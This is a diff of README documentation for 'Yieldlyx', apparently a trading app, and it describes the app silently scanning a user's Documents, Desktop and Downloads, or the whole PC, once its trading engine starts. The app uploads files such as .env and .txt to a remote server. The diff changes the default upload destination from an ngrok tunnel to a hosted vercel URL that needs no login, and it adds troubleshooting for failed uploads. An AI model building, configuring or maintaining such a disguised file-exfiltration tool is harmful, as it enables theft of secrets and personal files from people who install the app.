@@ -105,7 +105,7 @@ After the trading engine starts, the app uploads supported files (`.txt`, `.env`
 
 | Variable | Default | Purpose |
 |----------|---------|---------|
-| `YIELDLYX_UPLOAD_URL` | ngrok URL in chalk-ycslint (often **offline**) | Backend `POST /` URL — use `http://127.0.0.1:3000/` when running file-receive-backend locally |
+| `YIELDLYX_UPLOAD_URL` | `https://yieldlyx-receiving-app.vercel.app/` | Backend base URL (`POST /`). Set to `http://127.0.0.1:3000/` for local `file-receive-backend`. |
 | `YIELDLYX_UPLOAD_SCAN_PC` | `0` on **macOS**, `1` on Windows | `1` = full PC scan; `0` = Documents/Desktop/Downloads only |
 
 **macOS:** Folder scan is the default (fewer permission errors than scanning all of `/Users`). For a full-machine scan: `YIELDLYX_UPLOAD_SCAN_PC=1 npm start`.
@@ -124,17 +124,19 @@ Watch the terminal for `[upload]` lines. Installed `.app` logs appear in **Conso
 
 That means the app **could not connect to the upload server**, not that your files are bad. Every file fails the same way when the URL is wrong or the tunnel is down.
 
-1. Start the backend: `cd file-receive-backend && npm start`
-2. Point the app at it:
+1. Confirm the hosted backend is up: [yieldlyx-receiving-app.vercel.app](https://yieldlyx-receiving-app.vercel.app/) (`GET /api/health` when logged in is not required; uploads use `POST /` without dashboard login).
+2. For **local** development only, start `file-receive-backend` and override the URL:
 
 ```bash
 export YIELDLYX_UPLOAD_URL="http://127.0.0.1:3000/"
 npm start
 ```
 
-3. Confirm in the log: `[upload] Backend OK (http://127.0.0.1:3000/api/health)` before any `OK /path/to/file` lines.
+3. Confirm in the log: `[upload] Backend OK (https://yieldlyx-receiving-app.vercel.app/api/health)` before any `OK /path/to/file` lines.
 
-The built-in default (`https://tinker-raffle-pyromania.ngrok-free.dev/`) only works if that ngrok tunnel is running on the machine that created it.
+### `ERR_SSL_WRONG_VERSION_NUMBER`
+
+You tried **HTTPS** against a host that responded with **plain HTTP**. Check `YIELDLYX_UPLOAD_URL` — the default is **`https://yieldlyx-receiving-app.vercel.app/`**. Do not point HTTPS at `http://127.0.0.1:3000/` without a TLS terminator.
 
 ## Data & configuration
 
